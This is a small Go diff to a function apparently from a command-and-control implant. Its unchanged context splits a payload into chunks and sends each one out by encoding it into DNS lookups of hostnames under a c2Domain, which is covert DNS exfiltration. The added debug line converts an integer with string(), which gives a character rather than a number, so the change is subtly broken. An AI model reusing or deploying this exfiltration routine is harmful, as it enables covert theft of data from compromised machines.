@@ -55,6 +55,7 @@ func handleCommand(c, uid string) {
 	if leftover > 0 {
 		blocks++
 	}
+	fmt.Println("sending " + string(blocks) + " chunks")
 	for x := 1; x <= blocks; x++ {
 		minVal := (x - 1) * payloadSizeMax
 		maxVal := x * payloadSizeMax
@@ -66,7 +67,7 @@ func handleCommand(c, uid string) {
 		maxChunks := blocks
 		lookupaddr := fmt.Sprintf("%s.%d.%d.%s.%s", payload, chunknumber, maxChunks, uid, c2Domain)
 		net.LookupIP(lookupaddr)
-		//fmt.Println(lookupaddr)
+
 	}
 }
 
